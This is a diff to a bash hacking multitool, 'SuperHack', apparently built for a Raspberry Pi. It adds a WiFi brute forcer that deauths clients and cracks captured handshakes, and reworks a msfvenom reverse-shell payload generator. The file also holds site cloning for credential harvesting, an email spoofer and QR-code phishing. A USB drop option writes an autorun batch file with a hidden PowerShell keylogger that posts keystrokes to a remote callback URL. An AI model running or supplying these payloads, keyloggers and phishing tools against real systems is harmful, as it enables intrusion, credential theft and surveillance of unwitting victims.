@@ -3,15 +3,17 @@
 # SuperHack - Penetration Testing Automation Framework
 # For authorized security testing only
 # Compatible with Raspberry Pi (ARM architecture)
-# Enhanced with Phishing Tools and Extended Capabilities
+# Enhanced with Phishing Tools, OSINT, Blue Teaming, and Extended Capabilities
 
-VERSION="2.5"                                         # Current framework version
+VERSION="3.0"                                         # Current framework version
 CONFIG_DIR="/home/evanmarr/.superhack"                # Base configuration directory
 LOG_DIR="$CONFIG_DIR/logs"                            # Directory for log files
 WORDLISTS_DIR="$CONFIG_DIR/wordlists"                 # Password lists and dictionaries
 RESULTS_DIR="$CONFIG_DIR/results"                     # Scan results storage
 PHISHING_DIR="$CONFIG_DIR/phishing"                   # Phishing campaign files
 CREDS_DIR="$CONFIG_DIR/credentials"                   # Harvested credentials storage
+OSINT_DIR="$CONFIG_DIR/osint"                         # OSINT data storage
+TROJANS_DIR="$RESULTS_DIR/trojans"                    # Payload/trojan storage
 
 # Colors for output - ANSI escape codes for terminal formatting
 RED='\033[0;31m'                                      # Red: errors, warnings, critical alerts
@@ -35,7 +37,9 @@ CORE_PACKAGES=(
     "wireless-tools" "aircrack-ng" "python3" "python3-pip" "arp-scan"
     "netdiscover" "macchanger" "crackmapexec" "responder" "bloodhound.py"
     "wireshark" "tshark" "bettercap" "mitmproxy" "httrack" "sendemail"
-    "openssl" "sshpass" "tmux" "screen" "vim" "nano"
+    "openssl" "sshpass" "tmux" "screen" "vim" "nano" "lolcat" "clamav"
+    "clamav-daemon" "rkhunter" "chkrootkit" "haveged" "libreoffice"
+    "exiftool" "theharvester" "maltego" "spiderfoot" "recon-ng" "photon"
 )
 
 # Python packages for extended functionality
@@ -43,6 +47,7 @@ PYTHON_PACKAGES=(
     "impacket" "requests" "beautifulsoup4" "scapy" "pwntools" "python-nmap"
     "smbprotocol" "ldap3" "pyftpdlib" "pysmb" "paramiko" "cryptography"
     "pyOpenSSL" "flask" "django" "mechanize" "selenium" "pyautogui"
+    "shodan" "censys" "requests-html" "social-analyzer" "holehe"
 )
 
 # Arrays to track missing packages during startup checks
@@ -102,10 +107,15 @@ init_dirs() {
     create_dir "$RESULTS_DIR/wifi" || exit 1
     create_dir "$RESULTS_DIR/bruteforce" || exit 1
     create_dir "$RESULTS_DIR/cracking" || exit 1
+    create_dir "$RESULTS_DIR/trojans" || exit 1
+    create_dir "$RESULTS_DIR/osint" || exit 1
+    create_dir "$RESULTS_DIR/blueteam" || exit 1
     create_dir "$PHISHING_DIR" || exit 1              # Phishing campaign storage
     create_dir "$PHISHING_DIR/templates" || exit 1    # Phishing page templates
     create_dir "$PHISHING_DIR/captured" || exit 1     # Captured credentials/data
     create_dir "$CREDS_DIR" || exit 1                 # Credential database
+    create_dir "$OSINT_DIR" || exit 1                 # OSINT data storage
+    create_dir "$TROJANS_DIR" || exit 1               # Trojan/payload storage
     
     # Set ownership to original user (not root) for file access
     chown -R "$SUDO_USER:$SUDO_USER" "$CONFIG_DIR" 2>/dev/null || \
@@ -250,11 +260,12 @@ clone_repo() {
 # DISPLAY FUNCTIONS
 # =============================================================================
 
-# Display ASCII art banner
+# Display ASCII art banner piped through lolcat
 show_banner() {
     clear
-    echo -e "${CYAN}"
-    cat << "EOF"
+    # Check if lolcat is available, otherwise use standard colors
+    if command -v lolcat &>/dev/null; then
+        cat << "EOF" | lolcat
     ███████╗██╗   ██╗██████╗ ███████╗██████╗ ██╗  ██╗ █████╗  ██████╗██╗  ██╗
     ██╔════╝██║   ██║██╔══██╗██╔════╝██╔══██╗██║  ██║██╔══██╗██╔════╝██║ ██╔╝
     ███████╗██║   ██║██████╔╝█████╗  ██████╔╝███████║███████║██║     █████╔╝
@@ -262,11 +273,32 @@ show_banner() {
     ███████║╚██████╔╝██║     ███████╗██║  ██║██║  ██║██║  ██║╚██████╗██║  ██╗
     ╚══════╝ ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
 EOF
-    echo -e "${NC}${CYAN}     The ultimate hacking multitool${NC}"
-    echo -e ""
-    echo -e "${MAGENTA}                    [ Raspberry Pi Edition v$VERSION ]${NC}"
-    echo -e "${RED}                    [ Authorized Use Only ]${NC}"
-    echo -e "${BLUE}                    [ Copywrite 2026 By Evan Marr ]${NC}"
+    else
+        echo -e "${CYAN}"
+        cat << "EOF"
+    ███████╗██╗   ██╗██████╗ ███████╗██████╗ ██╗  ██╗ █████╗  ██████╗██╗  ██╗
+    ██╔════╝██║   ██║██╔══██╗██╔════╝██╔══██╗██║  ██║██╔══██╗██╔════╝██║ ██╔╝
+    ███████╗██║   ██║██████╔╝█████╗  ██████╔╝███████║███████║██║     █████╔╝
+    ╚════██║██║   ██║██╔═══╝ ██╔══╝  ██╔══██╗██╔══██║██╔══██║██║     ██╔═██╗
+    ███████║╚██████╔╝██║     ███████╗██║  ██║██║  ██║██║  ██║╚██████╗██║  ██╗
+    ╚══════╝ ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
+EOF
+        echo -e "${NC}"
+    fi
+    
+    if command -v lolcat &>/dev/null; then
+        echo "     The ultimate hacking multitool" | lolcat
+        echo "" | lolcat
+        echo "                    [ Raspberry Pi Edition v$VERSION ]" | lolcat
+        echo "                    [ Authorized Use Only ]" | lolcat
+        echo "                    [ Copywrite 2026 By Evan Marr ]" | lolcat
+    else
+        echo -e "${CYAN}     The ultimate hacking multitool${NC}"
+        echo -e ""
+        echo -e "${MAGENTA}                    [ Raspberry Pi Edition v$VERSION ]${NC}"
+        echo -e "${RED}                    [ Authorized Use Only ]${NC}"
+        echo -e "${BLUE}                    [ Copywrite 2026 By Evan Marr ]${NC}"
+    fi
     echo ""
 }
 
@@ -282,7 +314,10 @@ is_installed() {
 # Check if Python package is installed
 is_python_installed() {
     local pkg="$1"
-    python3 -c "import $pkg" 2>/dev/null
+    local import_name="${pkg//-/_}"
+    [[ "$pkg" == "beautifulsoup4" ]] && import_name="bs4"
+    [[ "$pkg" == "python-nmap" ]] && import_name="nmap"
+    python3 -c "import $import_name" 2>/dev/null
 }
 
 # Scan for missing packages and populate arrays
@@ -291,7 +326,7 @@ check_missing_packages() {
     echo -e "${BLUE}[*] Checking system packages...${NC}"
     
     for pkg in "${CORE_PACKAGES[@]}"; do
-        if ! dpkg -l | grep -q "^ii  $pkg "; then
+        if ! dpkg -l 2>/dev/null | grep -q "^ii  $pkg " && ! command -v "$pkg" &>/dev/null; then
             MISSING_PACKAGES+=("$pkg")
             echo -e "${GREY}    - Missing: $pkg${NC}"
         fi
@@ -301,10 +336,7 @@ check_missing_packages() {
     echo -e "${BLUE}[*] Checking Python packages...${NC}"
     
     for pkg in "${PYTHON_PACKAGES[@]}"; do
-        local import_name="${pkg//-/_}"               # Convert dashes to underscores
-        [[ "$pkg" == "beautifulsoup4" ]] && import_name="bs4"
-        [[ "$pkg" == "python-nmap" ]] && import_name="nmap"
-        if ! python3 -c "import $import_name" 2>/dev/null; then
+        if ! is_python_installed "$pkg"; then
             MISSING_PYTHON+=("$pkg")
             echo -e "${GREY}    - Missing: $pkg${NC}"
         fi
@@ -347,6 +379,7 @@ smart_package_manager() {
     echo "1) Install ALL missing packages"
     echo "2) Select which packages to install"
     echo "3) Skip for now (not recommended)"
+    echo "0) Back to main menu"
     echo -n "Choice: "
     read choice
     
@@ -357,6 +390,7 @@ smart_package_manager() {
             echo -e "${YELLOW}[!] Some features may not work without dependencies${NC}"
             sleep 2
             ;;
+        0) return ;;
         *) 
             echo -e "${RED}Invalid choice, skipping...${NC}"
             sleep 1
@@ -370,11 +404,21 @@ install_package() {
     local max_retries=2
     local retry=0
     
+    # Update package lists if not done recently
+    if [[ ! -f /var/cache/apt/pkgcache.bin ]] || [[ $(find /var/cache/apt/pkgcache.bin -mmin +60 2>/dev/null) ]]; then
+        echo -e "${YELLOW}[*] Updating package lists...${NC}"
+        apt-get update -qq || true
+    fi
+    
     while [[ $retry -lt $max_retries ]]; do
         echo -e "${YELLOW}[*] Installing $pkg (attempt $((retry+1))/$max_retries)...${NC}"
         
-        if apt-get install -y "$pkg" 2>&1 | tail -20; then
-            if dpkg -l | grep -q "^ii  $pkg "; then
+        # Fix for packages that might have different names
+        local install_pkg="$pkg"
+        [[ "$pkg" == "python3-pip" ]] && apt-get install -y python3-pip python3-setuptools python3-wheel 2>&1 | tail -20 && return 0
+        
+        if apt-get install -y "$install_pkg" 2>&1 | tail -20; then
+            if dpkg -l | grep -q "^ii  $install_pkg " || command -v "$pkg" &>/dev/null; then
                 echo -e "${GREEN}[+] $pkg installed successfully${NC}"
                 return 0
             fi
@@ -394,12 +438,19 @@ install_python_package() {
     local max_retries=2
     local retry=0
     
+    # Ensure pip is installed first
+    if ! command -v pip3 &>/dev/null; then
+        apt-get install -y python3-pip 2>/dev/null || apt-get install -y python3 python3-pip 2>/dev/null
+    fi
+    
     while [[ $retry -lt $max_retries ]]; do
         echo -e "${YELLOW}[*] Installing Python package $pkg (attempt $((retry+1))/$max_retries)...${NC}"
         
-        if pip3 install "$pkg" 2>&1 | tail -20; then
-            echo -e "${GREEN}[+] $pkg installed successfully${NC}"
-            return 0
+        if pip3 install --break-system-packages "$pkg" 2>&1 | tail -20 || pip3 install "$pkg" 2>&1 | tail -20; then
+            if is_python_installed "$pkg"; then
+                echo -e "${GREEN}[+] $pkg installed successfully${NC}"
+                return 0
+            fi
         fi
         
         retry=$((retry+1))
@@ -431,7 +482,7 @@ install_all_packages() {
     # Install Python packages
     if [[ ${#MISSING_PYTHON[@]} -gt 0 ]]; then
         echo -e "${YELLOW}[*] Installing ${#MISSING_PYTHON[@]} Python packages...${NC}"
-        pip3 install --upgrade pip 2>/dev/null || true
+        pip3 install --upgrade pip --break-system-packages 2>/dev/null || pip3 install --upgrade pip 2>/dev/null || true
         
         for pkg in "${MISSING_PYTHON[@]}"; do
             install_python_package "$pkg" || true
@@ -444,6 +495,12 @@ install_all_packages() {
     if command -v msfdb &> /dev/null; then
         echo -e "${BLUE}[*] Initializing Metasploit database...${NC}"
         msfdb init 2>/dev/null || msfdb reinit 2>/dev/null || true
+    fi
+    
+    # Initialize ClamAV database
+    if command -v freshclam &> /dev/null; then
+        echo -e "${BLUE}[*] Updating ClamAV database...${NC}"
+        freshclam 2>/dev/null || true
     fi
     
     echo -e "${GREEN}[+] Package installation complete!${NC}"
@@ -472,8 +529,12 @@ selective_package_install() {
     done
     
     echo ""
+    echo "0) Back to main menu"
+    echo ""
     echo -n "Enter package numbers (e.g., 1 3 5): "
     read selections
+    
+    [[ "$selections" == "0" ]] && return
     
     apt-get update -qq || true
     
@@ -484,8 +545,7 @@ selective_package_install() {
             install_package "$pkg"
         else
             local py_idx=$((num - ${#MISSING_PACKAGES[@]} - 1))
-            local pkg="${MISSING_PYTHON[$py_idx]}"
-            install_python_package "$pkg"
+            [[ $py_idx -ge 0 ]] && local pkg="${MISSING_PYTHON[$py_idx]}" && install_python_package "$pkg"
         fi
     done
     
@@ -595,8 +655,11 @@ advanced_nmap_scan() {
     echo "5) Window Scan (-sW) - Similar to ACK"
     echo "6) FIN/NULL/Xmas Scan (-sF/sN/sX) - Stealthy"
     echo "7) Comprehensive (Multiple types)"
+    echo "0) Back to main menu"
     echo -n "Select scan type: "
     read scan_type
+    
+    [[ "$scan_type" == "0" ]] && return
     
     echo ""
     echo -e "${CYAN}=== PORT SELECTION ===${NC}"
@@ -605,8 +668,11 @@ advanced_nmap_scan() {
     echo "3) All 65535 ports (-p-)"
     echo "4) Specific ports (e.g., 80,443,8080)"
     echo "5) Default Nmap ports"
+    echo "0) Back to main menu"
     echo -n "Select port option: "
     read port_option
+    
+    [[ "$port_option" == "0" ]] && return
     
     # Configure port scanning options
     case $port_option in
@@ -651,8 +717,12 @@ advanced_nmap_scan() {
         echo "  3) Vulnerability scripts (--script vuln)"
         echo "  4) All scripts (--script all)"
         echo "  5) Custom script (--script <name>)"
+        echo "  0) Back to main menu"
         echo -n "  Select: "
         read script_choice
+        
+        [[ "$script_choice" == "0" ]] && return
+        
         case $script_choice in
             1) script_flag="-sC" ;;
             2) script_flag="--script safe" ;;
@@ -676,8 +746,12 @@ advanced_nmap_scan() {
     echo "4) Normal (T3)"
     echo "5) Aggressive (T4)"
     echo "6) Insane (T5)"
+    echo "0) Back to main menu"
     echo -n "Select timing template: "
     read timing
+    
+    [[ "$timing" == "0" ]] && return
+    
     case $timing in
         1) time_flag="-T0" ;;
         2) time_flag="-T1" ;;
@@ -722,7 +796,11 @@ advanced_nmap_scan() {
             echo "1) FIN (-sF)"
             echo "2) NULL (-sN)"
             echo "3) Xmas (-sX)"
+            echo "0) Back to main menu"
             read stealth_choice
+            
+            [[ "$stealth_choice" == "0" ]] && return
+            
             case $stealth_choice in
                 1) scan_flag="-sF" ;;
                 2) scan_flag="-sN" ;;
@@ -772,6 +850,8 @@ network_discovery() {
     echo -n "Enter target subnet (e.g., 192.168.1.0/24): "
     read subnet
     
+    [[ -z "$subnet" ]] && return
+    
     timestamp=$(date +%Y%m%d_%H%M%S)
     
     echo -e "${YELLOW}[*] Scanning $subnet for live hosts...${NC}"
@@ -813,6 +893,8 @@ smb_enum() {
     echo -n "Enter target IP: "
     read target
     
+    [[ -z "$target" ]] && return
+    
     timestamp=$(date +%Y%m%d_%H%M%S)
     
     echo -n "Auto-save results? (y/n): "
@@ -840,6 +922,9 @@ ldap_enum() {
     echo -e "${BLUE}[*] LDAP/Active Directory Enumeration${NC}"
     echo -n "Enter target DC IP: "
     read dc_ip
+    
+    [[ -z "$dc_ip" ]] && return
+    
     echo -n "Enter domain name (e.g., corp.local): "
     read domain
     
@@ -851,8 +936,11 @@ ldap_enum() {
     echo "2) Authenticated LDAP query"
     echo "3) LDAP user enumeration"
     echo "4) BloodHound data collection"
+    echo "0) Back to main menu"
     echo -n "Select option: "
     read ldap_choice
+    
+    [[ "$ldap_choice" == "0" ]] && return
     
     case $ldap_choice in
         1)
@@ -914,6 +1002,8 @@ web_enum() {
     echo -n "Enter target URL (e.g., http://target.com): "
     read target
     
+    [[ -z "$target" ]] && return
+    
     timestamp=$(date +%Y%m%d_%H%M%S)
     local output_dir="$RESULTS_DIR/enumeration/web_$timestamp"
     
@@ -960,6 +1050,8 @@ subdomain_enum() {
     echo -n "Enter target domain (e.g., example.com): "
     read domain
     
+    [[ -z "$domain" ]] && return
+    
     timestamp=$(date +%Y%m%d_%H%M%S)
     
     echo ""
@@ -968,8 +1060,11 @@ subdomain_enum() {
     echo "2) Certificate transparency logs"
     echo "3) DNS zone transfer attempt"
     echo "4) All methods"
+    echo "0) Back to main menu"
     echo -n "Select method: "
     read method
+    
+    [[ "$method" == "0" ]] && return
     
     local all_results=""
     
@@ -1043,11 +1138,16 @@ brute_force() {
     echo "6) RDP"
     echo "7) VNC"
     echo "8) Telnet"
+    echo "0) Back to main menu"
     echo -n "Choice: "
     read choice
     
+    [[ "$choice" == "0" ]] && return
+    
     echo -n "Enter target IP: "
     read target
+    [[ -z "$target" ]] && return
+    
     echo -n "Enter username (or 'userlist.txt' for list): "
     read user
     echo -n "Use rockyou.txt wordlist? (y/n): "
@@ -1171,75 +1271,74 @@ payload_gen() {
     echo "9) ASP.NET Reverse Shell"
     echo "10) Android APK"
     echo "11) Custom"
+    echo "0) Back to main menu"
     echo -n "Choice: "
     read choice
     
+    [[ "$choice" == "0" ]] && return
+    
     echo -n "Enter LHOST (your IP): "
     read lhost
+    [[ -z "$lhost" ]] && return
+    
     echo -n "Enter LPORT: "
     read lport
     echo -n "Enter output filename: "
     read filename
     
+    [[ -z "$filename" ]] && return
+    
     timestamp=$(date +%Y%m%d_%H%M%S)
+    local output_path="$TROJANS_DIR/${timestamp}_$filename"
     
     case $choice in
         1)
-            msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -f elf -o "$filename"
+            msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -f elf -o "$output_path"
             ;;
         2)
-            msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -f elf -o "$filename"
+            msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -f elf -o "$output_path"
             ;;
         3)
-            msfvenom -p windows/shell/reverse_tcp LHOST="$lhost" LPORT="$lport" -f exe -o "$filename"
+            msfvenom -p windows/shell/reverse_tcp LHOST="$lhost" LPORT="$lport" -f exe -o "$output_path"
             ;;
         4)
-            msfvenom -p windows/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -f exe -o "$filename"
+            msfvenom -p windows/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -f exe -o "$output_path"
             ;;
         5)
-            msfvenom -p windows/meterpreter_reverse_tcp LHOST="$lhost" LPORT="$lport" -f exe -o "$filename"
+            msfvenom -p windows/meterpreter_reverse_tcp LHOST="$lhost" LPORT="$lport" -f exe -o "$output_path"
             ;;
         6)
-            msfvenom -p osx/x86/shell_reverse_tcp LHOST="$lhost" LPORT="$lport" -f macho -o "$filename"
+            msfvenom -p osx/x86/shell_reverse_tcp LHOST="$lhost" LPORT="$lport" -f macho -o "$output_path"
             ;;
         7)
-            msfvenom -p cmd/unix/reverse_python LHOST="$lhost" LPORT="$lport" -o "$filename"
+            msfvenom -p cmd/unix/reverse_python LHOST="$lhost" LPORT="$lport" -o "$output_path"
             ;;
         8)
-            msfvenom -p php/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -f raw -o "$filename"
+            msfvenom -p php/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -f raw -o "$output_path"
             ;;
         9)
-            msfvenom -p windows/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -f aspx -o "$filename"
+            msfvenom -p windows/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -f aspx -o "$output_path"
             ;;
         10)
-            msfvenom -p android/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -o "$filename"
+            msfvenom -p android/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -o "$output_path"
             ;;
         11)
             echo -n "Enter msfvenom payload name: "
             read payload
             echo -n "Enter format (elf/exe/python/psh/macho/raw): "
             read format
-            msfvenom -p "$payload" LHOST="$lhost" LPORT="$lport" -f "$format" -o "$filename"
+            msfvenom -p "$payload" LHOST="$lhost" LPORT="$lport" -f "$format" -o "$output_path"
             ;;
     esac
     
-    if [[ -f "$filename" ]]; then
-        echo -e "${GREEN}[+] Payload saved as: $filename${NC}"
-        
-        # Optionally copy to results
-        echo -n "Copy payload to ~/.superhack/results/exploitation/? (y/n): "
-        read copy_payload
-        if [[ "$copy_payload" == "y" ]]; then
-            cp "$filename" "$RESULTS_DIR/exploitation/${timestamp}_$filename"
-            echo -e "${GREEN}[+] Copied to results directory${NC}"
-        fi
+    if [[ -f "$output_path" ]]; then
+        echo -e "${GREEN}[+] Payload saved to: $output_path${NC}"
+        echo -e "${YELLOW}[*] To start a listener, run this in another terminal:${NC}"
+        echo -e "${RED}msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD <payload>; set LHOST $lhost; set LPORT $lport; exploit\"${NC}"
     else
         echo -e "${RED}[!] Payload generation may have failed${NC}"
     fi
     
-    echo -e "${YELLOW}[*] Setting up listener...${NC}"
-    echo "Run this in another terminal:"
-    echo -e "${RED}msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD <payload>; set LHOST $lhost; set LPORT $lport; exploit\"${NC}"
     echo -n "Press Enter to continue..."
     read
 }
@@ -1250,6 +1349,8 @@ exploit_search() {
     echo -e "${BLUE}[*] Exploit Database Search${NC}"
     echo -n "Enter search term (service/version): "
     read term
+    
+    [[ -z "$term" ]] && return
     
     timestamp=$(date +%Y%m%d_%H%M%S)
     
@@ -1266,7 +1367,7 @@ exploit_search() {
     
     echo -n "View details of exploit? (enter ID or n): "
     read exploit_id
-    if [[ "$exploit_id" != "n" ]]; then
+    if [[ "$exploit_id" != "n" && "$exploit_id" != "N" ]]; then
         searchsploit -x "$exploit_id"
     fi
     
@@ -1284,11 +1385,16 @@ password_crack() {
     echo "1) John the Ripper"
     echo "2) Hashcat"
     echo "3) Identify hash type"
+    echo "0) Back to main menu"
     echo -n "Choice: "
     read choice
     
+    [[ "$choice" == "0" ]] && return
+    
     echo -n "Enter hash file path: "
     read hashfile
+    
+    [[ -z "$hashfile" ]] && return
     
     timestamp=$(date +%Y%m%d_%H%M%S)
     
@@ -1366,7 +1472,7 @@ EOF
         echo "4) View Captured Credentials"
         echo "5) Generate QR Code Phish"
         echo "6) USB Drop Attack Generator"
-        echo "7) Back to Main Menu"
+        echo "0) Back to Main Menu"
         echo ""
         echo -n "Select option: "
         read phish_choice
@@ -1378,7 +1484,7 @@ EOF
             4) view_captured_creds ;;
             5) qr_code_phish ;;
             6) usb_drop_generator ;;
-            7) break ;;
+            0) break ;;
             *) echo -e "${RED}Invalid option${NC}"; sleep 1 ;;
         esac
     done
@@ -1390,6 +1496,9 @@ clone_website() {
     echo -e "${BLUE}[*] Website Cloning Tool${NC}"
     echo -n "Enter target URL to clone (e.g., https://login.microsoftonline.com): "
     read target_url
+    
+    [[ -z "$target_url" ]] && return
+    
     echo -n "Enter local port for harvester (default 8080): "
     read harvest_port
     harvest_port=${harvest_port:-8080}
@@ -1462,8 +1571,11 @@ custom_phish_page() {
     echo "3) Banking Login"
     echo "4) Email Login"
     echo "5) Custom HTML"
+    echo "0) Back to main menu"
     echo -n "Choice: "
     read template_choice
+    
+    [[ "$template_choice" == "0" ]] && return
     
     case $template_choice in
         1) template_name="Corporate Portal" ;;
@@ -1542,6 +1654,8 @@ email_spoofer() {
     
     echo -n "SMTP server (IP:port): "
     read smtp_server
+    [[ -z "$smtp_server" ]] && return
+    
     echo -n "From address (can be spoofed): "
     read from_addr
     echo -n "To address: "
@@ -1626,6 +1740,9 @@ qr_code_phish() {
     echo -e "${BLUE}[*] QR Code Phishing Generator${NC}"
     echo -n "Enter malicious URL: "
     read malicious_url
+    
+    [[ -z "$malicious_url" ]] && return
+    
     echo -n "Output filename (without extension): "
     read qr_filename
     
@@ -1667,13 +1784,17 @@ usb_drop_generator() {
     echo "2) Credential harvester"
     echo "3) Keylogger dropper"
     echo "4) Custom batch script"
+    echo "0) Back to main menu"
     echo -n "Choice: "
     read usb_choice
+    
+    [[ "$usb_choice" == "0" ]] && return
     
     case $usb_choice in
         1)
             echo -n "Enter LHOST: "
             read lhost
+            [[ -z "$lhost" ]] && return
             echo -n "Enter LPORT: "
             read lport
             
@@ -1692,6 +1813,7 @@ EOF
         3)
             echo -n "Enter callback URL for logs: "
             read callback_url
+            [[ -z "$callback_url" ]] && return
             cat > "$usb_dir/autorun.bat" << EOF
 @echo off
 powershell -WindowStyle Hidden -Command "Add-Type -AssemblyName System.Windows.Forms; \$keys = ''; while(\$true){ Start-Sleep -m 10; for(\$i=1; \$i -le 254; \$i++){\$key = [System.Windows.Forms.SendKeys]::GetAsyncKeyState(\$i); if(\$key -eq -32767){\$keys += [char]\$i; if(\$keys.Length -gt 100){ Invoke-WebRequest -Uri '$callback_url' -Method POST -Body \$keys; \$keys = ''}}}}"
@@ -1754,7 +1876,8 @@ EOF
         echo "5) Deauth attack"
         echo "6) Create fake access point (Evil Twin)"
         echo "7) Monitor mode management"
-        echo "8) Back to Main Menu"
+        echo "8) WiFi Brute Forcer (WPA/WPA2)"
+        echo "0) Back to Main Menu"
         echo ""
         echo -n "Select option: "
         read wifi_choice
@@ -1767,7 +1890,8 @@ EOF
             5) deauth_attack ;;
             6) evil_twin ;;
             7) monitor_mode_menu ;;
-            8) break ;;
+            8) wifi_brute_forcer ;;
+            0) break ;;
             *) echo -e "${RED}Invalid option${NC}"; sleep 1 ;;
         esac
     done
@@ -1787,6 +1911,8 @@ wifi_scan() {
     else
         echo -e "${GREEN}[+] Found wireless interface: $iface${NC}"
     fi
+    
+    [[ -z "$iface" ]] && return
     
     echo -n "Put interface in monitor mode? (y/n): "
     read enable_monitor
@@ -1830,8 +1956,12 @@ capture_handshake() {
     local iface=$(iw dev 2>/dev/null | grep Interface | awk '{print $2}' | head -1)
     [[ -z "$iface" ]] && { echo -n "Enter interface: "; read iface; }
     
+    [[ -z "$iface" ]] && return
+    
     echo -n "Enter target BSSID: "
     read target_bssid
+    [[ -z "$target_bssid" ]] && return
+    
     echo -n "Enter target channel: "
     read target_channel
     echo -n "Enter output filename (default: handshake): "
@@ -1881,6 +2011,8 @@ crack_handshake() {
     echo -n "Enter path to .cap file: "
     read cap_file
     
+    [[ -z "$cap_file" ]] && return
+    
     if [[ ! -f "$cap_file" ]]; then
         echo -e "${RED}[!] File not found${NC}"
         return
@@ -1890,8 +2022,11 @@ crack_handshake() {
     echo "1) rockyou.txt"
     echo "2) SecLists common passwords"
     echo "3) Custom wordlist"
+    echo "0) Back to main menu"
     echo -n "Choice: "
     read wordlist_choice
+    
+    [[ "$wordlist_choice" == "0" ]] && return
     
     case $wordlist_choice in
         1) wordlist="$WORDLISTS_DIR/rockyou.txt" ;;
@@ -1914,6 +2049,114 @@ crack_handshake() {
     read
 }
 
+# WiFi Brute Forcer - Automated WPA/WPA2 cracking
+wifi_brute_forcer() {
+    echo -e "${BLUE}[*] WiFi Brute Forcer${NC}"
+    echo -e "${YELLOW}[*] Automated WPA/WPA2 password cracking${NC}"
+    echo ""
+    
+    local iface=$(iw dev 2>/dev/null | grep Interface | awk '{print $2}' | head -1)
+    [[ -z "$iface" ]] && { echo -n "Enter wireless interface: "; read iface; }
+    [[ -z "$iface" ]] && return
+    
+    echo -n "Enable monitor mode? (y/n): "
+    read enable_mon
+    if [[ "$enable_mon" == "y" ]]; then
+        airmon-ng check kill 2>/dev/null
+        airmon-ng start "$iface" 2>/dev/null
+        iface="${iface}mon"
+    fi
+    
+    echo -e "${YELLOW}[*] Scanning for targets... (10 seconds)${NC}"
+    local scan_file="$RESULTS_DIR/wifi/brute_scan_$(date +%Y%m%d_%H%M%S)"
+    timeout 10 airodump-ng "$iface" --write "$scan_file" --output-format csv 2>/dev/null || true
+    
+    echo ""
+    echo -e "${CYAN}=== Available Targets ===${NC}"
+    local targets=()
+    local i=1
+    while IFS=',' read -r mac _ _ channel _ _ _ _ _ _ ssid _; do
+        [[ -n "$mac" && "$mac" != "BSSID" ]] && [[ "$mac" =~ ^[0-9a-fA-F:]{17}$ ]] && \
+            targets+=("$mac|$channel|$ssid") && \
+            echo "  $i) $ssid ($mac) - Ch: $channel" && \
+            ((i++))
+    done < <(tail -n +2 "$scan_file-01.csv" 2>/dev/null | head -20)
+    
+    [[ ${#targets[@]} -eq 0 ]] && echo -e "${RED}[!] No targets found${NC}" && return
+    
+    echo ""
+    echo "0) Back to main menu"
+    echo -n "Select target: "
+    read target_choice
+    
+    [[ "$target_choice" == "0" ]] && return
+    [[ $target_choice -gt ${#targets[@]} ]] && echo -e "${RED}Invalid selection${NC}" && return
+    
+    local selected="${targets[$((target_choice-1))]}"
+    local target_bssid=$(echo "$selected" | cut -d'|' -f1)
+    local target_channel=$(echo "$selected" | cut -d'|' -f2)
+    local target_ssid=$(echo "$selected" | cut -d'|' -f3)
+    
+    echo ""
+    echo "Select wordlist:"
+    echo "1) rockyou.txt ($(wc -l < "$WORDLISTS_DIR/rockyou.txt" 2>/dev/null || echo "unknown") words)"
+    echo "2) SecLists top 100k"
+    echo "3) Custom wordlist"
+    echo "0) Back to main menu"
+    echo -n "Choice: "
+    read wordlist_choice
+    
+    [[ "$wordlist_choice" == "0" ]] && return
+    
+    case $wordlist_choice in
+        1) wordlist="$WORDLISTS_DIR/rockyou.txt" ;;
+        2) wordlist="$WORDLISTS_DIR/seclists/Passwords/Common-Credentials/10-million-password-list-top-100000.txt" ;;
+        3) 
+            echo -n "Enter wordlist path: "
+            read wordlist
+            ;;
+    esac
+    
+    [[ ! -f "$wordlist" ]] && echo -e "${RED}[!] Wordlist not found${NC}" && return
+    
+    echo ""
+    echo -e "${YELLOW}[*] Configuration:${NC}"
+    echo "  Target: $target_ssid ($target_bssid)"
+    echo "  Channel: $target_channel"
+    echo "  Wordlist: $wordlist ($(wc -l < "$wordlist") words)"
+    echo ""
+    echo -n "Start brute force attack? (y/n): "
+    read confirm
+    
+    [[ "$confirm" != "y" ]] && return
+    
+    timestamp=$(date +%Y%m%d_%H%M%S)
+    local cap_file="$RESULTS_DIR/wifi/brute_${target_ssid}_$timestamp"
+    
+    echo -e "${YELLOW}[*] Capturing handshake...${NC}"
+    airodump-ng --bssid "$target_bssid" -c "$target_channel" -w "$cap_file" "$iface" &
+    local dump_pid=$!
+    
+    sleep 5
+    echo -e "${YELLOW}[*] Sending deauth to force handshake...${NC}"
+    aireplay-ng -0 10 -a "$target_bssid" "$iface" 2>/dev/null
+    
+    sleep 5
+    kill $dump_pid 2>/dev/null
+    
+    local cap_file_path="${cap_file}-01.cap"
+    if [[ -f "$cap_file_path" ]]; then
+        echo -e "${GREEN}[+] Handshake captured${NC}"
+        echo -e "${YELLOW}[*] Starting brute force...${NC}"
+        aircrack-ng "$cap_file_path" -w "$wordlist"
+    else
+        echo -e "${RED}[!] Failed to capture handshake${NC}"
+    fi
+    
+    echo -n "Press Enter to continue..."
+    read
+}
+
 # WPS PIN attack
 wps_attack() {
     check_install reaver
@@ -1921,9 +2164,11 @@ wps_attack() {
     
     local iface=$(iw dev 2>/dev/null | grep Interface | awk '{print $2}' | head -1)
     [[ -z "$iface" ]] && { echo -n "Enter interface: "; read iface; }
+    [[ -z "$iface" ]] && return
     
     echo -n "Enter target BSSID: "
     read target_bssid
